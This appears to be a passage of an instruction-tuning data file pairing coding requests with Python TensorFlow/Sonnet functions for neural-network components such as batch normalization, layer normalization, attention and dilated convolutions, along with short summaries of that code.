{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn an initial learnable state.", "response": "def _single_learnable_state(state, state_id=0, learnable=True):\n  \"\"\"Returns an initial (maybe learnable) state.\n\n  This function does not create any variable scopes, and it should be called\n  from a Sonnet module. This function also makes sure that all the rows of its\n  `state` argument have the same value.\n\n  Args:\n    state: initial value of the initial state. It should be a tensor of at least\n      two dimensions, of which the first dimension corresponds to the\n      batch_size dimension. All rows of such tensor should have the same value.\n    state_id: integer that uniquely identifies this state.\n    learnable: boolean that indicates whether the state is learnable.\n\n  Returns:\n    The initial learnable state `Tensor`.\n  \"\"\"\n  unpacked_state = tf.unstack(state)\n  # Assert that all rows have the same values.\n  assert_rows_equal = [tf.assert_equal(s, unpacked_state[0])\n                       for s in unpacked_state]\n\n  # We wish to have all the graph assertions in the graph's critical path,\n  # so we include them even if the initial state is left unmodified (i.e. when\n  # the state is not learnable).\n  # Note: All these assertions will be run every time that data flows\n  # through the graph. At that point, the control_dependencies context manager\n  # makes sure that such assertions are run, and will raise an exception if any\n  # fails.\n  with tf.control_dependencies(assert_rows_equal):\n    if not learnable:\n      return state\n    else:\n      state_shape = state.get_shape()\n      state_shape.assert_is_fully_defined()\n      state_shape_list = state_shape.as_list()\n      batch_size, trailing_shape = state_shape_list[0], state_shape_list[1:]\n\n      initial_value = tf.reshape(unpacked_state[0], [1] + trailing_shape)\n      initial_state_variable = tf.get_variable(\n          \"initial_state_%d\" % state_id, dtype=initial_value.dtype,\n          initializer=initial_value)\n\n      trailing_size_repeat = [1] * len(trailing_shape)\n      return tf.tile(initial_state_variable,\n                     tf.constant([batch_size] + trailing_size_repeat))"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns an initial state consisting of trainable variables.", "response": "def trainable_initial_state(batch_size, state_size, dtype, initializers=None,\n                            regularizers=None, name=None):\n  \"\"\"Creates an initial state consisting of trainable variables.\n\n  The trainable variables are created with the same shapes as the elements of\n  `state_size` and are tiled to produce an initial state.\n\n  Args:\n    batch_size: An int, or scalar int32 Tensor representing the batch size.\n    state_size: A `TensorShape` or nested tuple of `TensorShape`s to use for the\n        shape of the trainable variables.\n    dtype: The data type used to create the variables and thus initial state.\n    initializers: An optional container of the same structure as `state_size`\n        containing initializers for the variables.\n    regularizers: An optional container of the same structure as `state_size`\n        containing regularizers for the variables.\n    name: optional string used to prefix the initial state variable names.\n\n  Returns:\n    A `Tensor` or nested tuple of `Tensor`s with the same size and structure\n    as `state_size`, where each `Tensor` is a tiled trainable `Variable`.\n\n  Raises:\n    ValueError: if the user passes initializers that are not functions.\n    ValueError: if the user passes regularizers that are not functions.\n  \"\"\"\n  flat_state_size = nest.flatten(state_size)\n\n  if not initializers:\n    flat_initializer = tuple(tf.zeros_initializer() for _ in flat_state_size)\n  else:\n    nest.assert_same_structure(initializers, state_size)\n    flat_initializer = nest.flatten(initializers)\n    if not all([callable(init) for init in flat_initializer]):\n      raise ValueError(\"Not all the passed initializers are callable objects.\")\n\n  if not regularizers:\n    flat_regularizer = tuple({} for _ in flat_state_size)\n  else:\n    nest.assert_same_structure(regularizers, state_size)\n    flat_regularizer = nest.flatten(regularizers)\n    if not all([callable(regularizer) for regularizer in flat_regularizer]):\n      raise ValueError(\"Not all the passed regularizers are callable objects.\")\n\n  # Produce names for the variables. In the case of a tuple or nested tuple,\n  # this is just a sequence of numbers, but for a flat `namedtuple`, we use\n  # the field names. NOTE: this could be extended to nested `namedtuple`s,\n  # but for now that's extra complexity that's not used anywhere.\n  name_prefix = name or \"initial_state\"\n  try:\n    name_suffixes = [\n        state_size._fields[i] for i in xrange(len(flat_state_size))]\n  except (AttributeError, IndexError):\n    name_suffixes = range(len(flat_state_size))\n\n  flat_initial_state = []\n\n  for name_suffix, size, init, regularizer in zip(\n      name_suffixes, flat_state_size, flat_initializer, flat_regularizer):\n    shape_with_batch_dim = [1] + tf.TensorShape(size).as_list()\n\n    variable_name = \"{}_{}\".format(name_prefix, name_suffix)\n    initial_state_module = basic.TrainableVariable(\n        shape_with_batch_dim, dtype=dtype, initializers={\"w\": init},\n        regularizers={\"w\": regularizer}, name=variable_name)\n    initial_state_variable = initial_state_module()\n\n    tiled_name = \"state_{}_tiled\".format(name_suffix)\n\n    initial_state_variable_dims = initial_state_variable.get_shape().ndims\n    tile_dims = [batch_size] + [1] * (initial_state_variable_dims - 1)\n    flat_initial_state.append(\n        tf.tile(initial_state_variable, tile_dims, name=tiled_name))\n\n  return nest.pack_sequence_as(structure=state_size,\n                               flat_sequence=flat_initial_state)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a decorator to copy documentation from the given function.", "response": "def with_doc(fn_with_doc_to_copy):\n  \"\"\"Returns a decorator to copy documentation from the given function.\n\n  Docstring is copied, including *args and **kwargs documentation.\n\n  Args:\n    fn_with_doc_to_copy: Function whose docstring, including *args and\n      **kwargs documentation, is to be copied.\n\n  Returns:\n    Decorated version of `wrapper_init` with documentation copied from\n    `fn_with_doc_to_copy`.\n  \"\"\"\n\n  def decorator(wrapper_init):\n    # Wrap the target class's constructor (to assume its docstring),\n    # but invoke the wrapper class's constructor.\n    @wrapt.decorator\n    def wrapping_fn(unused_wrapped, instance, args, kwargs):\n      wrapper_init(instance, *args, **kwargs)\n    return wrapping_fn(fn_with_doc_to_copy)  # pylint: disable=no-value-for-parameter\n\n  return decorator"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _build(self):\n    flat_initial_state = nest.flatten(self._initial_state)\n    if self._mask is not None:\n      flat_mask = nest.flatten(self._mask)\n      flat_learnable_state = [\n          _single_learnable_state(state, state_id=i, learnable=mask)\n          for i, (state, mask) in enumerate(zip(flat_initial_state, flat_mask))]\n    else:\n      flat_learnable_state = [_single_learnable_state(state, state_id=i)\n                              for i, state in enumerate(flat_initial_state)]\n\n    return nest.pack_sequence_as(structure=self._initial_state,\n                                 flat_sequence=flat_learnable_state)", "response": "Connects the module to the graph."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _build(self, inputs):\n\n    if self._axis is None:\n      axis = list(range(1, inputs.shape.ndims))\n    else:\n      axis = self._axis\n\n    original_dtype = inputs.dtype\n    if original_dtype in [tf.float16, tf.bfloat16]:\n      inputs = tf.cast(inputs, tf.float32)\n\n    if inputs.get_shape().ndims < 2:\n      raise base.NotSupportedError(\n          \"Layer normalization expects inputs of at least rank 2.\"\n          \" Got inputs of rank {}.\".format(inputs.get_shape().ndims))\n\n    # Shape for the learnable scale and offset is the number of channels. See\n    # https://arxiv.org/pdf/1803.08494.pdf around equation 6.\n    params_shape = inputs.get_shape()[-1:]\n\n    if self._scale:\n      if self.GAMMA not in self._initializers:\n        self._initializers[self.GAMMA] = create_gamma_initializer()\n      self._gamma = tf.get_variable(\n          self.GAMMA,\n          shape=params_shape,\n          dtype=inputs.dtype,\n          initializer=self._initializers[self.GAMMA],\n          partitioner=self._partitioners.get(self.GAMMA),\n          regularizer=self._regularizers.get(self.GAMMA))\n    else:\n      self._gamma = None\n\n    if self._offset:\n      if self.BETA not in self._initializers:\n        self._initializers[self.BETA] = create_beta_initializer()\n      self._beta = tf.get_variable(\n          self.BETA,\n          shape=params_shape,\n          dtype=inputs.dtype,\n          initializer=self._initializers[self.BETA],\n          partitioner=self._partitioners.get(self.BETA),\n          regularizer=self._regularizers.get(self.BETA))\n    else:\n      self._beta = None\n\n    mean, var = tf.nn.moments(inputs, axis, keep_dims=True)\n\n    normalized = tf.nn.batch_normalization(inputs, mean, var, self._beta,\n                                           self._gamma, self._eps)\n\n    if original_dtype in [tf.float16, tf.bfloat16]:\n      normalized = tf.cast(normalized, dtype=original_dtype)\n    return normalized", "response": "Connects the LayerNorm module into the graph."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _build(self, memory, query, memory_mask=None):\n    if len(memory.get_shape()) != 3:\n      raise base.IncompatibleShapeError(\n          \"memory must have shape [batch_size, memory_size, memory_word_size].\")\n\n    if len(query.get_shape()) != 2:\n      raise base.IncompatibleShapeError(\n          \"query must have shape [batch_size, query_word_size].\")\n\n    if memory_mask is not None and len(memory_mask.get_shape()) != 2:\n      raise base.IncompatibleShapeError(\n          \"memory_mask must have shape [batch_size, memory_size].\")\n\n    # Ensure final dimensions are defined, else the attention logit module will\n    # be unable to infer input size when constructing variables.\n    inferred_memory_word_size = memory.get_shape()[2].value\n    inferred_query_word_size = query.get_shape()[1].value\n    if inferred_memory_word_size is None or inferred_query_word_size is None:\n      raise base.UnderspecifiedError(\n          \"memory_word_size and query_word_size must be known at graph \"\n          \"construction time.\")\n\n    memory_shape = tf.shape(memory)\n    batch_size = memory_shape[0]\n    memory_size = memory_shape[1]\n\n    query_shape = tf.shape(query)\n    query_batch_size = query_shape[0]\n\n    # Transform query to have same number of words as memory.\n    #\n    # expanded_query: [batch_size, memory_size, query_word_size].\n    expanded_query = tf.tile(tf.expand_dims(query, dim=1), [1, memory_size, 1])\n\n    # Compute attention weights for each memory slot.\n    #\n    # attention_weight_logits: [batch_size, memory_size]\n    with tf.control_dependencies(\n        [tf.assert_equal(batch_size, query_batch_size)]):\n      concatenated_embeddings = tf.concat(\n          values=[memory, expanded_query], axis=2)\n\n    batch_apply_attention_logit = basic.BatchApply(\n        self._attention_logit_mod, n_dims=2, name=\"batch_apply_attention_logit\")\n    attention_weight_logits = batch_apply_attention_logit(\n        concatenated_embeddings)\n\n    # Note: basic.BatchApply() will automatically reshape the [batch_size *\n    # memory_size, 1]-shaped result of self._attention_logit_mod(...) into a\n    # [batch_size, memory_size, 1]-shaped Tensor. If\n    # self._attention_logit_mod(...) returns something with more dimensions,\n    # then attention_weight_logits will have extra dimensions, too.\n    if len(attention_weight_logits.get_shape()) != 3:\n      raise base.IncompatibleShapeError(\n          \"attention_weight_logits must be a rank-3 Tensor. Are you sure that \"\n          \"attention_logit_mod() returned [batch_size * memory_size, 1]-shaped\"\n          \" Tensor?\")\n\n    # Remove final length-1 dimension.\n    attention_weight_logits = tf.squeeze(attention_weight_logits, [2])\n\n    # Mask out ignored memory slots by assigning them very small logits. Ensures\n    # that every example has at least one valid memory slot, else we'd end up\n    # averaging all memory slots equally.\n    if memory_mask is not None:\n      num_remaining_memory_slots = tf.reduce_sum(\n          tf.cast(memory_mask, dtype=tf.int32), axis=[1])\n      with tf.control_dependencies(\n          [tf.assert_positive(num_remaining_memory_slots)]):\n        finfo = np.finfo(np.float32)\n        kept_indices = tf.cast(memory_mask, dtype=tf.float32)\n        ignored_indices = tf.cast(tf.logical_not(memory_mask), dtype=tf.float32)\n        lower_bound = finfo.max * kept_indices + finfo.min * ignored_indices\n        attention_weight_logits = tf.minimum(attention_weight_logits,\n                                             lower_bound)\n\n    # attended_memory: [batch_size, memory_word_size].\n    attention_weight = tf.reshape(\n        tf.nn.softmax(attention_weight_logits),\n        shape=[batch_size, memory_size, 1])\n    # The multiplication is elementwise and relies on broadcasting the weights\n    # across memory_word_size. Then we sum across the memory slots.\n    attended_memory = tf.reduce_sum(memory * attention_weight, axis=[1])\n\n    # Infer shape of result as much as possible.\n    inferred_batch_size, _, inferred_memory_word_size = (\n        memory.get_shape().as_list())\n    attended_memory.set_shape([inferred_batch_size, inferred_memory_word_size])\n\n    return AttentionOutput(\n        read=attended_memory,\n        weights=tf.squeeze(attention_weight, [2]),\n        weight_logits=attention_weight_logits)", "response": "Builds the list of attention outputs for a differentiable read."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nbuilding the statistics part of the graph when using moving mean and variance.", "response": "def _build_statistics(self, input_batch, use_batch_stats, stat_dtype):\n    \"\"\"Builds the statistics part of the graph when using moving variance.\n\n    Args:\n      input_batch: Input batch Tensor.\n      use_batch_stats: Boolean to indicate if batch statistics should be\n        calculated, otherwise moving averages are returned.\n      stat_dtype: TensorFlow datatype to use for the moving mean and variance.\n\n    Returns:\n      Tuple of (mean, variance), each of the same datatype as `input_batch`.\n    \"\"\"\n    # Set up our moving statistics. When connecting in parallel, this is shared.\n    if self.MOVING_MEAN not in self._initializers:\n      self._initializers[self.MOVING_MEAN] = create_mean_initializer()\n    self._moving_mean = tf.get_variable(\n        \"moving_mean\",\n        dtype=stat_dtype,\n        shape=(self._num_channels,),\n        collections=[\n            tf.GraphKeys.MOVING_AVERAGE_VARIABLES,\n            tf.GraphKeys.GLOBAL_VARIABLES,\n        ],\n        initializer=self._initializers[self.MOVING_MEAN],\n        trainable=False)\n\n    if self.MOVING_VARIANCE not in self._initializers:\n      self._initializers[self.MOVING_VARIANCE] = create_variance_initializer()\n    self._moving_variance = tf.get_variable(\n        \"moving_variance\",\n        dtype=stat_dtype,\n        shape=(self._num_channels,),\n        collections=[\n            tf.GraphKeys.MOVING_AVERAGE_VARIABLES,\n            tf.GraphKeys.GLOBAL_VARIABLES,\n        ],\n        initializer=self._initializers[self.MOVING_VARIANCE],\n        trainable=False)\n\n    def build_batch_stats():\n      \"\"\"Builds the batch statistics calculation ops.\"\"\"\n      mean, variance = tf.nn.moments(input_batch, self._axis,\n                                     keep_dims=True, name=\"normalize_moments\")\n\n      return mean, variance\n\n    def build_moving_stats():\n      \"\"\"Retrieves the moving statistics.\"\"\"\n      # If necessary, cast the moving statistics to match the input type.\n      # This is required by tf.nn.batch_normalization.\n      input_dtype = input_batch.dtype.base_dtype\n      if stat_dtype == input_dtype:\n        return (\n            tf.identity(self._moving_mean),\n            tf.identity(self._moving_variance),\n        )\n      else:\n        return (\n            tf.cast(self._moving_mean, input_dtype),\n            tf.cast(self._moving_variance, input_dtype),\n        )\n\n    mean, variance = utils.smart_cond(\n        use_batch_stats,\n        build_batch_stats,\n        build_moving_stats,\n    )\n\n    return mean, variance"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _build_update_ops(self, mean, variance, is_training):\n\n    def build_update_ops():\n      \"\"\"Builds the exponential moving average update ops.\"\"\"\n\n      update_mean_op = moving_averages.assign_moving_average(\n          variable=self._moving_mean,\n          value=tf.reshape(mean, (self._num_channels,)),\n          decay=self._decay_rate,\n          zero_debias=False,\n          name=\"update_moving_mean\").op\n\n      update_variance_op = moving_averages.assign_moving_average(\n          variable=self._moving_variance,\n          value=tf.reshape(variance, (self._num_channels,)),\n          decay=self._decay_rate,\n          zero_debias=False,\n          name=\"update_moving_variance\").op\n\n      return update_mean_op, update_variance_op\n\n    def build_no_ops():\n      return (tf.no_op(), tf.no_op())\n\n    # Only make the ops if we know that `is_training=True`, or the value of\n    # `is_training` is unknown.\n    is_training_const = utils.constant_value(is_training)\n    if is_training_const is None or is_training_const:\n      update_mean_op, update_variance_op = utils.smart_cond(\n          is_training,\n          build_update_ops,\n          build_no_ops,\n      )\n      return (update_mean_op, update_variance_op)\n    else:\n      return None", "response": "Builds the update ops for moving average."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncreate a fused batch normalization op.", "response": "def _fused_batch_norm_op(self, input_batch, mean, variance, use_batch_stats):\n    \"\"\"Creates a fused batch normalization op.\"\"\"\n    # Store the original shape of the mean and variance.\n    mean_shape = mean.get_shape()\n    variance_shape = variance.get_shape()\n    # The fused batch norm expects the mean, variance, gamma and beta\n    # tensors to have dimension 1, so we flatten them to remove the\n    # extra dimensions. In addition, it expects the input_batch to have\n    # dimension 4, so we reshape it accordingly.\n    gamma_flatten = tf.reshape(self._gamma, shape=(self._num_channels,))\n    beta_flatten = tf.reshape(self._beta, shape=(self._num_channels,))\n    flatten_mean = tf.reshape(mean, shape=(self._num_channels,))\n    flatten_variance = tf.reshape(variance, shape=(self._num_channels,))\n    use_batch_stats = tf.convert_to_tensor(use_batch_stats)\n\n    input_shape = input_batch.get_shape()\n    output_shape = [-1] + input_shape.as_list()[1:]\n\n    flat_image_size = np.prod(self._image_shape, dtype=np.int32)\n\n    if len(self._data_format) == 4:\n      fusable_data_format = self._data_format\n      fusable_batch = input_batch\n    elif self._channel_index == 1 and self._image_shape:\n      fusable_data_format = \"NCHW\"\n      fusable_batch = tf.reshape(\n          input_batch,\n          shape=(-1, self._num_channels, 1, flat_image_size))\n    else:\n      # The CPU implementation of FusedBatchNorm only supports NHWC tensor\n      # format for now.\n      fusable_data_format = \"NHWC\"\n      fusable_batch = tf.reshape(\n          input_batch,\n          shape=(-1, 1, flat_image_size, self._num_channels))\n\n    common_args = {\n        \"scale\": gamma_flatten,\n        \"offset\": beta_flatten,\n        \"epsilon\": self._eps,\n        \"data_format\": fusable_data_format,\n        \"name\": \"batch_norm\"\n    }\n\n    def use_batch_stats_fused_batch_norm():\n      return tf.nn.fused_batch_norm(\n          fusable_batch,\n          mean=None,\n          variance=None,\n          is_training=True,\n          **common_args)\n\n    def moving_average_fused_batch_norm():\n      return tf.nn.fused_batch_norm(\n          fusable_batch,\n          mean=flatten_mean,\n          variance=flatten_variance,\n          is_training=False,\n          **common_args)\n\n    batch_norm_op, mean, variance = utils.smart_cond(\n        use_batch_stats, use_batch_stats_fused_batch_norm,\n        moving_average_fused_batch_norm)\n\n    if len(self._data_format) != 4:\n      batch_norm_op = tf.reshape(batch_norm_op, output_shape)\n    mean = tf.reshape(mean, mean_shape)\n    variance = tf.reshape(variance, variance_shape)\n    return batch_norm_op, mean, variance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _build(self,\n             input_batch,\n             is_training,\n             test_local_stats=False):\n    \"\"\"Connects the BatchNormV2 module into the graph.\n\n    Args:\n      input_batch: A Tensor of the same dimension as `len(data_format)`.\n      is_training: A boolean to indicate if the module should be connected in\n        training mode, meaning the moving averages are updated. Can be a Tensor.\n      test_local_stats: A boolean to indicate if local batch statistics should\n        be used when `is_training=False`. If not, moving averages are used.\n        By default `False`. Can be a Tensor.\n\n    Returns:\n      A tensor with the same shape as `input_batch`.\n\n    Raises:\n      base.IncompatibleShapeError: If `data_format` is not valid for the\n        input shape.\n      base.NotSupportedError: If `input_batch` has data type of `tf.bfloat16`.\n    \"\"\"\n    input_shape = input_batch.get_shape()\n\n    if not self._data_format:\n      if len(input_shape) == 2:\n        self._data_format = \"NC\"\n      elif len(input_shape) == 3:\n        self._data_format = \"NWC\"\n      elif len(input_shape) == 4:\n        self._data_format = \"NHWC\"\n      elif len(input_shape) == 5:\n        self._data_format = \"NDHWC\"\n      else:\n        raise base.IncompatibleShapeError(\n            \"Input shape {} has too many or too few dimensions.\".format(\n                input_shape))\n\n    self._channel_index = self._data_format.index(\"C\")\n    # Use list to turn range into iterator in python3.\n    self._axis = list(range(len(self._data_format)))\n    del self._axis[self._channel_index]\n\n    if len(self._data_format) != len(input_shape):\n      raise base.IncompatibleShapeError(\n          \"Incorrect data format {} for input shape {}.\".format(\n              self._data_format, input_shape))\n\n    dtype = input_batch.dtype.base_dtype\n    if self._fused and dtype == tf.bfloat16:\n      raise base.NotSupportedError(\n          \"Fused batch norm does not support tf.bfloat16.\")\n    # Maintain moving averages at a minimum precision of tf.float32.\n    stat_dtype = tf.float32 if dtype in [tf.float16, tf.bfloat16] else dtype\n\n    self._num_channels = int(input_shape[self._channel_index])\n    if self._channel_index == 1:\n      self._image_shape = [int(x) for x in input_shape[2:]]\n    else:\n      self._image_shape = [int(x) for x in input_shape[1:-1]]\n\n    self._expanded_mean_shape = [1] * len(input_shape)\n    self._expanded_mean_shape[self._channel_index] = self._num_channels\n\n    use_batch_stats = is_training | test_local_stats\n\n    mean, variance = self._build_statistics(input_batch, use_batch_stats,\n                                            stat_dtype)\n\n    # Sets up optional gamma and beta parameters\n    self._build_scale_offset(dtype)\n    # Sets up the batch normalization op.\n    out, mean, variance = self._batch_norm_op(input_batch, mean, variance,\n                                              use_batch_stats, stat_dtype)\n    # Sets up the update op.\n    update_ops = self._build_update_ops(mean, variance, is_training)\n\n    # Put update ops in the update ops collection if given, otherwise add as\n    # control dependencies of the output.\n    if update_ops:\n      if self._update_ops_collection:\n        for update_op in update_ops:\n          tf.add_to_collection(self._update_ops_collection, update_op)\n      else:\n        with tf.control_dependencies(update_ops):\n          out = tf.identity(out)\n\n    return out", "response": "Connects the BatchNormV2 module into the graph."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _range_along_dimension(range_dim, shape):\n  rank = len(shape)\n  if range_dim >= rank:\n    raise ValueError(\"Cannot calculate range along non-existent index.\")\n  indices = tf.range(start=0, limit=shape[range_dim])\n  indices = tf.reshape(\n      indices,\n      shape=[1 if i != range_dim else shape[range_dim] for i in range(rank)])\n  return tf.tile(indices,\n                 [shape[i] if i != range_dim else 1 for i in range(rank)])", "response": "Construct a Tensor that counts the distance along a single dimension. This is a helper function for calculating the range along a single dimension."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconstructs an initializer function for constructing a noisy identity convolution kernels.", "response": "def noisy_identity_kernel_initializer(base_num_channels, stddev=1e-8):\n  \"\"\"Build an initializer for constructing near-identity convolution kernels.\n\n  Construct a convolution kernel where in_channels and out_channels are\n  multiples of base_num_channels, but need not be equal. This initializer is\n  essentially the same as identity_kernel_initializer, except that magnitude\n  is \"spread out\" across multiple copies of the input.\n\n  Args:\n    base_num_channels: int. Number that divides both in_channels and\n      out_channels.\n    stddev: float. Standard deviation of truncated normal noise added to\n      off-entries to break ties.\n\n  Returns:\n    Initializer function for building a noisy identity kernel.\n  \"\"\"\n\n  # pylint: disable=unused-argument\n  def _noisy_identity_kernel_initializer(shape,\n                                         dtype=tf.float32,\n                                         partition_info=None):\n    \"\"\"Constructs a noisy identity kernel.\n\n    Args:\n      shape: List of integers. Represents shape of result.\n      dtype: data type for values in result.\n      partition_info: Partition information for initializer functions. Ignored.\n\n    Returns:\n      Tensor of desired shape and dtype such that applying it as a convolution\n        kernel results in a noisy near-identity operation.\n\n    Raises:\n      ValueError: If shape does not define a valid kernel.\n                  If filter width and height differ.\n                  If filter width and height are not odd numbers.\n                  If number of input and output channels are not multiples of\n                    base_num_channels.\n    \"\"\"\n    if len(shape) != 4:\n      raise ValueError(\"Convolution kernels must be rank 4.\")\n\n    filter_height, filter_width, in_channels, out_channels = shape\n\n    if filter_width != filter_height:\n      raise ValueError(\n          \"Noisy identity initializer only works for square filters.\")\n    if filter_width % 2 != 1:\n      raise ValueError(\n          \"Noisy identity initializer requires filters have odd height and \"\n          \"width.\")\n    if (in_channels % base_num_channels != 0 or\n        out_channels % base_num_channels != 0):\n      raise ValueError(\"in_channels and out_channels must both be multiples of \"\n                       \"base_num_channels.\")\n\n    middle_pixel = filter_height // 2\n    is_middle_pixel = tf.logical_and(\n        tf.equal(_range_along_dimension(0, shape), middle_pixel),\n        tf.equal(_range_along_dimension(1, shape), middle_pixel))\n    is_same_channel_multiple = tf.equal(\n        tf.floordiv(\n            _range_along_dimension(2, shape) * base_num_channels, in_channels),\n        tf.floordiv(\n            _range_along_dimension(3, shape) * base_num_channels, out_channels))\n    noise = tf.truncated_normal(shape, stddev=stddev, dtype=dtype)\n    return tf.where(\n        tf.logical_and(is_same_channel_multiple, is_middle_pixel),\n        tf.ones(\n            shape, dtype=dtype) * (base_num_channels / out_channels),\n        noise)\n\n  return _noisy_identity_kernel_initializer"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nbuild the dilation module.", "response": "def _build(self, images):\n    \"\"\"Build dilation module.\n\n    Args:\n      images: Tensor of shape [batch_size, height, width, depth]\n        and dtype float32. Represents a set of images with an arbitrary depth.\n        Note that when using the default initializer, depth must equal\n        num_output_classes.\n\n    Returns:\n      Tensor of shape [batch_size, height, width, num_output_classes] and dtype\n        float32. Represents, for each image and pixel, logits for per-class\n        predictions.\n\n    Raises:\n      IncompatibleShapeError: If images is not rank 4.\n      ValueError: If model_size is not one of 'basic' or 'large'.\n    \"\"\"\n    num_classes = self._num_output_classes\n\n    if len(images.get_shape()) != 4:\n      raise base.IncompatibleShapeError(\n          \"'images' must have shape [batch_size, height, width, depth].\")\n\n    if self.WEIGHTS not in self._initializers:\n      if self._model_size == self.BASIC:\n        self._initializers[self.WEIGHTS] = identity_kernel_initializer\n      elif self._model_size == self.LARGE:\n        self._initializers[self.WEIGHTS] = noisy_identity_kernel_initializer(\n            num_classes)\n      else:\n        raise ValueError(\"Unrecognized model_size: %s\" % self._model_size)\n\n    if self.BIASES not in self._initializers:\n      self._initializers[self.BIASES] = tf.zeros_initializer()\n\n    if self._model_size == self.BASIC:\n      self._conv_modules = [\n          self._dilated_conv_layer(num_classes, 1, True, \"conv1\"),\n          self._dilated_conv_layer(num_classes, 1, True, \"conv2\"),\n          self._dilated_conv_layer(num_classes, 2, True, \"conv3\"),\n          self._dilated_conv_layer(num_classes, 4, True, \"conv4\"),\n          self._dilated_conv_layer(num_classes, 8, True, \"conv5\"),\n          self._dilated_conv_layer(num_classes, 16, True, \"conv6\"),\n          self._dilated_conv_layer(num_classes, 1, True, \"conv7\"),\n          self._dilated_conv_layer(num_classes, 1, False, \"conv8\"),\n      ]\n    elif self._model_size == self.LARGE:\n      self._conv_modules = [\n          self._dilated_conv_layer(2 * num_classes, 1, True, \"conv1\"),\n          self._dilated_conv_layer(2 * num_classes, 1, True, \"conv2\"),\n          self._dilated_conv_layer(4 * num_classes, 2, True, \"conv3\"),\n          self._dilated_conv_layer(8 * num_classes, 4, True, \"conv4\"),\n          self._dilated_conv_layer(16 * num_classes, 8, True, \"conv5\"),\n          self._dilated_conv_layer(32 * num_classes, 16, True, \"conv6\"),\n          self._dilated_conv_layer(32 * num_classes, 1, True, \"conv7\"),\n          self._dilated_conv_layer(num_classes, 1, False, \"conv8\"),\n      ]\n    else:\n      raise ValueError(\"Unrecognized model_size: %s\" % self._model_size)\n\n    dilation_mod = sequential.Sequential(self._conv_modules, name=\"dilation\")\n    return dilation_mod(images)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncreates a dilated convolution layer.", "response": "def _dilated_conv_layer(self, output_channels, dilation_rate, apply_relu,\n                          name):\n    \"\"\"Create a dilated convolution layer.\n\n    Args:\n      output_channels: int. Number of output channels for each pixel.\n      dilation_rate: int. Represents how many pixels each stride offset will\n        move. A value of 1 indicates a standard convolution.\n      apply_relu: bool. If True, a ReLU non-linearlity is added.\n      name: string. Name for layer.\n\n    Returns:\n      a sonnet Module for a dilated convolution.\n    \"\"\"\n    layer_components = [\n        conv.Conv2D(\n            output_channels, [3, 3],\n            initializers=self._initializers,\n            regularizers=self._regularizers,\n            rate=dilation_rate,\n            name=\"dilated_conv_\" + name),\n    ]\n    if apply_relu:\n      layer_components.append(lambda net: tf.nn.relu(net, name=\"relu_\" + name))\n    return sequential.Sequential(layer_components, name=name)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nwrapping the function and prints a warning - once per extra_message.", "response": "def with_deprecation_warning(fn, extra_message=''):\n  \"\"\"Wraps the function and prints a warn-once (per `extra_message`) warning.\"\"\"\n  def new_fn(*args, **kwargs):\n    if extra_message not in _DONE_WARN:\n      tf.logging.warning(\n          'Sonnet nest is deprecated. Please use '\n          'tf.contrib.framework.nest instead. '\n          + extra_message\n      )\n      _DONE_WARN[extra_message] = True\n    return fn(*args, **kwargs)\n  return new_fn"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef custom_build(inputs, is_training, keep_prob):\n  outputs = snt.Conv2D(output_channels=32, kernel_shape=4, stride=2)(inputs)\n  outputs = snt.BatchNorm()(outputs, is_training=is_training)\n  outputs = tf.nn.relu(outputs)\n  outputs = snt.Conv2D(output_channels=64, kernel_shape=4, stride=2)(outputs)\n  outputs = snt.BatchNorm()(outputs, is_training=is_training)\n  outputs = tf.nn.relu(outputs)\n  outputs = snt.BatchFlatten()(outputs)\n  outputs = tf.nn.dropout(outputs, keep_prob=keep_prob)\n  outputs = snt.Linear(output_size=10)(outputs)\n  return outputs", "response": "A custom build method to wrap into a sonnet Module."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _get_or_create_stack(name):\n  stack = getattr(_LOCAL_STACKS, name, None)\n  if stack is None:\n    stack = []\n    setattr(_LOCAL_STACKS, name, stack)\n  return stack", "response": "Returns a thread local stack uniquified by the given name."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef bayes_by_backprop_getter(\n    posterior_builder=diagonal_gaussian_posterior_builder,\n    prior_builder=fixed_gaussian_prior_builder,\n    kl_builder=stochastic_kl_builder,\n    sampling_mode_tensor=None,\n    fresh_noise_per_connection=True,\n    keep_control_dependencies=False):\n  \"\"\"Creates a custom getter which does Bayes by Backprop.\n\n  Please see `tf.get_variable` for general documentation on custom getters.\n\n  All arguments are optional. If nothing is configued, then a diagonal gaussian\n  posterior will be used, and a fixed N(0, 0.01) prior will be used. Please\n  see the default `posterior_builder` and `prior_builder` for a more detailed\n  understanding of the default settings.\n\n  Args:\n    posterior_builder: A builder function which constructs an instance of\n      `tfp.distributions.Distribution` which shall serve as the posterior over\n      the `tf.Variable` of interest. The builder receives the `getter` and the\n      arguments forwarded from `tf.get_variable`. Suppose one wrote\n\n      ```\n      tf.get_variable(\n          'weights', shape=(3,), initializer=tf.zeros_initializer,\n          dtype=tf.float32)\n      ```\n\n      then the `posterior_builder` argument would receive the `name`, `shape`,\n      `initializer`, and `dtype` arguments passed above. The builder must return\n      a `tfp.distributions.Distribution` object.\n\n      Please see the `tf.get_variable` for documentation on `custom_getter` and\n      `getter`, and see `bbb.diagonal_gaussian_posterior_builder`\n      (the default) for an example of using this builder API.\n    prior_builder: A builder function which constructs an instance of\n      `tfp.distributions.Distribution` which shall serve as the prior over the\n      `tf.Variable` of interest. 